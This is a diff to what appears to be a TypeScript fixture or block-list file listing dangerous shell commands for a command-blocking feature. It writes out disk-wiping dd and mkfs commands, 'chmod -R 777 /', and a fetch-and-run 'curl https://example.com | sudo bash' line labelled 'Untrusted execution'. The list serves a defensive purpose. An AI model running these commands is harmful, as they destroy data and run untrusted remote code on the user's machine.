@@ -15,10 +15,10 @@ export const dangerousCommands = {
   chmod777: 'chmod -R 777 /',
   mkfs: 'mkfs.ext4 /dev/sda',
   ddZero: 'dd if=/dev/zero of=/dev/sda',
-  curlBash: 'curl ... | sudo bash',
+  curlBash: 'curl https://example.com | sudo bash',
   chmodDir: 'chmod -R 777 folder/',
   sudoRemove: 'sudo apt-get remove package',
-  ddSda: 'dd if=/dev/zero of=/dev/sda',
+  ddTruncate: 'dd if=/dev/zero of=/dev/sda bs=1M',
   mkfsSda1: 'mkfs.ext4 /dev/sda1',
 } as const;
 
@@ -43,7 +43,7 @@ export const srePatterns = [
 export const blockedCommandsList = [
   { command: dangerousCommands.rmrf, label: 'Filesystem destruction' },
   { command: dangerousCommands.forkBomb, label: 'Fork bomb' },
-  { command: dangerousCommands.ddSda, label: 'Disk wipe' },
+  { command: dangerousCommands.ddTruncate, label: 'Disk wipe' },
   { command: dangerousCommands.chmod777, label: 'Permission disaster' },
   { command: dangerousCommands.curlBash, label: 'Untrusted execution' },
 ] as const;
